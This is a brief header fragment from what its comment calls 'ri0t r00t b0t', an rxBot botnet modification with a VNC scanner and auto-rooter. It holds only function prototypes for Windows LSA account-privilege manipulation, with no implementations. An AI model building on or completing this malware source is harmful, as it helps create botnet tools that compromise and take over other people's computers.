/*

    ri0t r00t b0t by h1t3m of h1t3m.org | h4cky0u.org

     (rxBot MP modded with vnc scanner / auto-r00ter)

*/


#ifndef NO_LSARESTRICT
void InitLsaString(PLSA_UNICODE_STRING LsaString, LPWSTR String);
NTSTATUS SetPrivilegeOnAccount(LSA_HANDLE PolicyHandle, PSID AccountSid, LPWSTR PrivilegeName, BOOL bEnable);
DWORD AddPrivilegeToAccount(LSA_HANDLE PolicyHandle, LPWSTR AccountName, LPWSTR PrivilegeName);
DWORD SearchForPrivilegedAccounts(LPWSTR PrivilegeName, BOOL bEnable=FALSE);
#endif